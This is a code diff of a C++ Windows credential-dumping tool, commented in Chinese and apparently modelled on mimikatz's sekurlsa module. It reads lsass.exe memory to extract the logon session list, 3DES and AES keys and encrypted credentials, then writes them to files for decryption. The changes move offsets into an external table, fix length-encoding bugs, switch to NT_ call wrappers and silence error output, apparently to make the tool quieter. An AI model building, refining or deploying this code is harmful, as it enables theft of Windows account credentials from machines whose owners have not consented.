@@ -1,45 +1,7 @@
 #include <Windows.h>
 #include <winternl.h>
-#include <stdio.h>
-#include <iostream>
 
-#define DEBUG
-
-
-bool EnableDebugPrivilege()
-{
-    HANDLE tokenHandle;
-    TOKEN_PRIVILEGES tokenPrivileges;
-    LUID luid;
-
-    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &tokenHandle))
-    {
-        std::cout << "Failed to open process token. Error: " << GetLastError() << std::endl;
-        return false;
-    }
-
-    if (!LookupPrivilegeValue(nullptr, SE_DEBUG_NAME, &luid))
-    {
-        std::cout << "Failed to lookup privilege value. Error: " << GetLastError() << std::endl;
-        CloseHandle(tokenHandle);
-        return false;
-    }
-
-    tokenPrivileges.PrivilegeCount = 1;
-    tokenPrivileges.Privileges[0].Luid = luid;
-    tokenPrivileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
-
-    if (!AdjustTokenPrivileges(tokenHandle, FALSE, &tokenPrivileges, sizeof(TOKEN_PRIVILEGES), nullptr, nullptr))
-    {
-        std::cout << "Failed to adjust token privileges. Error: " << GetLastError() << std::endl;
-        CloseHandle(tokenHandle);
-        return false;
-    }
-
-    CloseHandle(tokenHandle);
-    return true;
-}
-
+// #define DEBUG
 
 
 
@@ -248,11 +210,10 @@ inline bool _compare_lsasrv_name(char* dll_name) {
 }
 
 
-int main(int argc, char* argv[]) {
-    EnableDebugPrivilege();
-    DWORD _offset_table[TABLE_LENGTH][3] = {
-        {0x32BC3,0x39E5C,0x9E36E},
-        {0x1FA63,0x395DC,0x8CA6C}
+int main() {
+    DWORD _offset_table[TABLE_LENGTH][4] = {
+        {0x32BC3,0x39E5C,0x9E36E,0x108},
+        {0x1FA63,0x395DC,0x8CA6C,0x108}
     };
 
 
@@ -359,6 +320,7 @@ int main(int argc, char* argv[]) {
     DWORD _logon_session_list_offset = _offset_table[_index][0];
     DWORD _3des_key_offset = _offset_table[_index][1];
     DWORD _aes_key_offset = _offset_table[_index][2];
+    DWORD _credential_offset = _offset_table[_index][3];
 
     // 剩下的7位，是lsass.exe进程的PID
     DWORD _lsass_pid = (_buffer[3] - '0') * 1000000 + (_buffer[4] - '0') * 100000 +
@@ -490,7 +452,8 @@ int main(int argc, char* argv[]) {
         // 密文的偏移量和操作系统版本有关，具体请参考mimikatz源码
         // C:\Users\123\Downloads\mimikatz-main\mimikatz-master (1)\mimikatz\modules\sekurlsa\kuhl_m_sekurlsa.c#L300
         // 对于win10及以上版本，使用0x108即可
-        char* _p_credential_addr = _logon_session_list_addr + 0x108;
+        // 后面想了想，决定把这个偏移量也放在由main程序传过来的文件中
+        char* _p_credential_addr = _logon_session_list_addr + _credential_offset;
         // 这个地址中保存了credential的地址，因此我们需要取出其中的内容
         // 读取lsass进程内存
         SecureZeroMemory(stack_string, 50);
@@ -587,7 +550,7 @@ int main(int argc, char* argv[]) {
         );
 
         if (hFile == INVALID_HANDLE_VALUE) {
-            fprintf(stderr, "Error creating/opening the file\n");
+            //fprintf(stderr, "Error creating/opening the file\n");
             return 1;
         }
 
@@ -597,22 +560,22 @@ int main(int argc, char* argv[]) {
         // 为了和之前的解密脚本保持一致，我们使用4字节作为长度
         byteArray[0] = (BYTE)(_cipher_length & 0xFF);         // Low byte
         byteArray[1] = (BYTE)((_cipher_length >> 8) & 0xFF);  // High byte
-        byteArray[1] = (BYTE)((_cipher_length >> 16) & 0xFF);  // High byte
-        byteArray[1] = (BYTE)((_cipher_length >> 24) & 0xFF);  // High byte 
+        byteArray[2] = (BYTE)((_cipher_length >> 16) & 0xFF);  // High byte
+        byteArray[3] = (BYTE)((_cipher_length >> 24) & 0xFF);  // High byte 
 
         // Write the byte array to the file
         DWORD bytesWritten;
         if (!NT_WriteFile(hFile, byteArray, sizeof(byteArray), &bytesWritten, NULL)) {
-            fprintf(stderr, "Error writing to the file\n");
-            CloseHandle(hFile);
+            //fprintf(stderr, "Error writing to the file\n");
+            NT_CloseHandle(hFile);
             return 1;
         }
 
         // 写入密文
         DWORD _out_para = 0;
         if (!NT_WriteFile(hFile, buffer, _cipher_length, &_out_para, NULL)) {
-            fprintf(stderr, "Error writing to the file\n");
-            CloseHandle(hFile);
+            //fprintf(stderr, "Error writing to the file\n");
+            NT_CloseHandle(hFile);
             return 1;
         }
 
@@ -655,7 +618,7 @@ int main(int argc, char* argv[]) {
     );
 
     if (hFile == INVALID_HANDLE_VALUE) {
-        fprintf(stderr, "Error creating/opening the file\n");
+        //fprintf(stderr, "Error creating/opening the file\n");
         return 1;
     }
 
@@ -666,22 +629,22 @@ int main(int argc, char* argv[]) {
     // 为了和之前的解密脚本保持一致，我们使用4字节作为长度
     byteArray[0] = (BYTE)(_3des_len & 0xFF);         // Low byte
     byteArray[1] = (BYTE)((_3des_len >> 8) & 0xFF);  // High byte
-    byteArray[1] = (BYTE)((_3des_len >> 16) & 0xFF);  // High byte
-    byteArray[1] = (BYTE)((_3des_len >> 24) & 0xFF);  // High byte 
+    byteArray[2] = (BYTE)((_3des_len >> 16) & 0xFF);  // High byte
+    byteArray[3] = (BYTE)((_3des_len >> 24) & 0xFF);  // High byte 
 
     // Write the byte array to the file
     DWORD bytesWritten;
     if (!NT_WriteFile(hFile, byteArray, sizeof(byteArray), &bytesWritten, NULL)) {
-        fprintf(stderr, "Error writing to the file\n");
-        CloseHandle(hFile);
+     //   fprintf(stderr, "Error writing to the file\n");
+        NT_CloseHandle(hFile);
         return 1;
     }
 
     // 写入密文
     DWORD _out_para = 0;
     if (!NT_WriteFile(hFile, stack_string, _3des_len, &_out_para, NULL)) {
-        fprintf(stderr, "Error writing to the file\n");
-        CloseHandle(hFile);
+       // fprintf(stderr, "Error writing to the file\n");
+        NT_CloseHandle(hFile);
         return 1;
     }
 
@@ -725,7 +688,7 @@ int main(int argc, char* argv[]) {
     );
 
     if (hFile == INVALID_HANDLE_VALUE) {
-        fprintf(stderr, "Error creating/opening the file\n");
+       // fprintf(stderr, "Error creating/opening the file\n");
         return 1;
     }
 
@@ -734,20 +697,20 @@ int main(int argc, char* argv[]) {
     // 为了和之前的解密脚本保持一致，我们使用4字节作为长度
     byteArray[0] = (BYTE)(_aes_len & 0xFF);         // Low byte
     byteArray[1] = (BYTE)((_aes_len >> 8) & 0xFF);  // High byte
-    byteArray[1] = (BYTE)((_aes_len >> 16) & 0xFF);  // High byte
-    byteArray[1] = (BYTE)((_aes_len >> 24) & 0xFF);  // High byte
+    byteArray[2] = (BYTE)((_aes_len >> 16) & 0xFF);  // High byte
+    byteArray[3] = (BYTE)((_aes_len >> 24) & 0xFF);  // High byte
 
     // Write the byte array to the file
     if (!NT_WriteFile(hFile, byteArray, sizeof(byteArray), &bytesWritten, NULL)) {
-        fprintf(stderr, "Error writing to the file\n");
-        CloseHandle(hFile);
+       // fprintf(stderr, "Error writing to the file\n");
+        NT_CloseHandle(hFile);
         return 1;
     }
 
     // 写入密文
     if (!NT_WriteFile(hFile, stack_string, _aes_len, &_out_para, NULL)) {
-        fprintf(stderr, "Error writing to the file\n");
-        CloseHandle(hFile);
+       // fprintf(stderr, "Error writing to the file\n");
+        NT_CloseHandle(hFile);
         return 1;
     }
 
